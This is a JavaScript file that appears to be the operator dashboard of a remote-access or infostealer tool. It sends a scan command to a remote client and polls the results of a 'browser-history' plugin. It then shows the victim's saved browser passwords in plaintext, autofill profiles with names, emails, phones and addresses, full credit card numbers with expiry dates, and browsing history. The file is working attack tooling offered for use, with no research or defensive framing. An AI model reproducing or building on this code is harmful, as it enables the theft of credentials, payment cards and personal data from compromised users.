const params            = new URLSearchParams(window.location.search);
const clientIdInput     = document.getElementById("client-id");
const scanBtn           = document.getElementById("scan-btn");
const statusPill        = document.getElementById("status-pill");
const countBadge        = document.getElementById("count-badge");
const pwdCountBadge     = document.getElementById("pwd-count-badge");
const profileCountBadge = document.getElementById("profile-count-badge");
const cardCountBadge    = document.getElementById("card-count-badge");
const resultsArea       = document.getElementById("results-area");
const passwordsArea     = document.getElementById("passwords-area");
const profilesArea      = document.getElementById("profiles-area");
const cardsArea         = document.getElementById("cards-area");
const logEl             = document.getElementById("log");

const pluginId = "browser-history";
const clientId = params.get("clientId") || "";
clientIdInput.value = clientId;

let pollTimer = null;

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
}

function setStatus(text, cls) {
  statusPill.textContent = text;
  statusPill.className = "status-pill " + cls;
}

function getClientId() {
  return clientIdInput.value.trim();
}

function escapeHtml(s) {
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function extractDomain(url) {
  try { return new URL(url).hostname.replace(/^www\./,""); } catch(_) { return url; }
}

function groupByFirstLetter(items, keyFn) {
  const groups = {};
  for (const item of items) {
    const k = keyFn(item) || "";
    const l = (k[0] || "#").toUpperCase();
    if (!groups[l]) groups[l] = [];
    groups[l].push(item);
  }
  return groups;
}

async function sendPluginEvent(event, payload) {
  const id = getClientId();
  if (!id) { log("No client ID"); return; }
  const res = await fetch(
    `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/event`,
    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ event, payload }) }
  );
  if (!res.ok) {
    const text = await res.text();
    log(`sendEvent failed: ${res.status} ${text}`);
  }
}

async function pollEvents() {
  const id = getClientId();
  if (!id) return;
  try {
    const res = await fetch(
      `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/events`,
      { method: "GET" }
    );
    if (!res.ok) { log(`poll failed: ${res.status}`); return; }
    const data = await res.json();
    for (const item of data.events || []) {
      handleIncomingEvent(item.event, item.payload);
    }
  } catch (err) {
    log(`poll error: ${err.message}`);
  }
}

function renderPasswords(passwords, total) {
  pwdCountBadge.textContent = String(total);
  pwdCountBadge.classList.toggle("hidden", total === 0);
  if (total === 0) { passwordsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved passwords found.</p>`; return; }
  const groups = groupByFirstLetter(passwords, p => extractDomain(p.url));
  passwordsArea.innerHTML = Object.keys(groups).sort().map(l => {
    const rows = groups[l].map(p =>
      `<tr><td class="url-cell">${escapeHtml(p.url)}</td><td class="title-cell">${escapeHtml(p.username)}</td><td class="password-cell">${escapeHtml(p.password)}</td><td class="source-cell">${escapeHtml(p.source)}</td></tr>`
    ).join("");
    return `<div class="category-group"><div class="category-title cat-pwd"><span class="cat-dot"></span>${escapeHtml(l)} (${groups[l].length})</div><table class="wallet-table"><thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }).join("");
}

function renderProfiles(profiles, total) {
  profileCountBadge.textContent = String(total);
  profileCountBadge.classList.toggle("hidden", total === 0);
  if (total === 0) { profilesArea.innerHTML = `<p class="no-wallets">&#x2714; No autofill profiles found.</p>`; return; }
  const rows = profiles.map(p =>
    `<tr><td class="title-cell">${escapeHtml(p.fullName)}</td><td class="title-cell">${escapeHtml(p.email)}</td><td class="title-cell">${escapeHtml(p.phone)}</td><td class="title-cell">${escapeHtml([p.address,p.city,p.state,p.zip,p.country].filter(Boolean).join(", "))}</td><td class="source-cell">${escapeHtml(p.source)}</td></tr>`
  ).join("");
  profilesArea.innerHTML = `<div class="category-group"><div class="category-title cat-profile"><span class="cat-dot"></span>Profiles (${total})</div><table class="wallet-table"><thead><tr><th>Name</th><th>Email</th><th>Phone</th><th>Address</th><th>Browser</th></tr></thead><tbody>${rows}</tbody></table></div>`;
}

function renderCards(cards, total) {
  cardCountBadge.textContent = String(total);
  cardCountBadge.classList.toggle("hidden", total === 0);
  if (total === 0) { cardsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved credit cards found.</p>`; return; }
  const rows = cards.map(c =>
    `<tr><td class="title-cell">${escapeHtml(c.nameOnCard)}</td><td class="card-number-cell">${escapeHtml(c.number)}</td><td class="title-cell">${escapeHtml(c.expMonth)}/${escapeHtml(c.expYear)}</td><td class="source-cell">${escapeHtml(c.source)}</td></tr>`
  ).join("");
  cardsArea.innerHTML = `<div class="category-group"><div class="category-title cat-card"><span class="cat-dot"></span>Credit Cards (${total})</div><table class="wallet-table"><thead><tr><th>Name on Card</th><th>Number</th><th>Expiry</th><th>Browser</th></tr></thead><tbody>${rows}</tbody></table></div>`;
}

function renderResults(entries, total) {
  countBadge.textContent = String(total);
  countBadge.classList.toggle("hidden", total === 0);
  if (total === 0) { resultsArea.innerHTML = `<p class="no-wallets">&#x2714; No browsing history found.</p>`; return; }
  const groups = groupByFirstLetter(entries, e => extractDomain(e.url));
  resultsArea.innerHTML = Object.keys(groups).sort().map(l => {
    const rows = groups[l].map(e =>
      `<tr><td class="url-cell"><a href="${escapeHtml(e.url)}" target="_blank" rel="noopener noreferrer">${escapeHtml(e.url)}</a></td><td class="title-cell">${escapeHtml(e.title||"")}</td><td class="source-cell">${escapeHtml(e.source)}</td></tr>`
    ).join("");
    return `<div class="category-group"><div class="category-title cat-letter"><span class="cat-dot"></span>${escapeHtml(l)} (${groups[l].length})</div><table class="wallet-table"><thead><tr><th>URL</th><th>Title</th><th>Browser</th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }).join("");
}

function handleIncomingEvent(event, payload) {
  if (event === "ready") {
    log("Plugin ready \u2014 scanning\u2026");
    setStatus("Scanning\u2026", "status-scanning");
  } else if (event === "history_result") {
    stopPolling();
    const total        = payload?.total ?? 0;
    const pwdTotal     = payload?.passwordTotal ?? 0;
    const profileTotal = payload?.profileTotal ?? 0;
    const cardTotal    = payload?.cardTotal ?? 0;
    log(`Done \u2014 ${total} URLs \u00B7 ${pwdTotal} passwords \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards`);
    setStatus(`${pwdTotal} pwd \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards \u00B7 ${total} URLs`, "status-found");
    renderPasswords(payload?.passwords ?? [], pwdTotal);
    renderProfiles(payload?.profiles ?? [], profileTotal);
    renderCards(payload?.cards ?? [], cardTotal);
    renderResults(payload?.entries ?? [], total);
    scanBtn.disabled = false;
  } else {
    log(`Event: ${event} \u2192 ${JSON.stringify(payload)}`);
  }
}

function startPolling() {
  stopPolling();
  pollTimer = setInterval(pollEvents, 2000);
  void pollEvents();
}

function stopPolling() {
  if (pollTimer !== null) { clearInterval(pollTimer); pollTimer = null; }
}

scanBtn.addEventListener("click", async () => {
  const id = getClientId();
  if (!id) { log("Enter a Client ID first"); return; }
  scanBtn.disabled = true;
  setStatus("Scanning\u2026", "status-scanning");
  log(`Scanning client: ${id}`);
  await sendPluginEvent("scan", {});
  startPolling();
});

if (!clientId) {
  log("No clientId in URL \u2014 paste one above and click Scan");
  setStatus("No client", "status-idle");
} else {
  log(`Client: ${clientId}`);
  setStatus("Awaiting scan\u2026", "status-scanning");
  startPolling();
}
